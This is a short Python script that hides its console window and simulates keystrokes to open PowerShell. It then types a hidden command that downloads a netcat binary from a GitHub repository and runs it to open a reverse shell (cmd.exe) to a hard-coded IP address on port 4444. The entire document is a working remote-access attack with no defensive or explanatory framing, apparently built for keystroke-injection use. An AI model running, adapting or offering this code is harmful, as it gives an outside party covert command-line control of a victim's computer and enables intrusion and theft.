import pyautogui
import time
import subprocess
import ctypes

# Step 1: Hide terminal window (Windows only)
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Step 2: Wait for system to be ready
time.sleep(2)

# Step 3: Simulate keystrokes
pyautogui.hotkey('win', 'r')           # Win + R
time.sleep(0.5)
pyautogui.write('powershell', interval=0.05)
pyautogui.press('enter')
time.sleep(1)

# Step 4: Type the payload
payload = 'powershell -w Hidden -Command Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.157.69 4444 -e cmd.exe'
pyautogui.write(payload, interval=0.05)
pyautogui.press('enter')
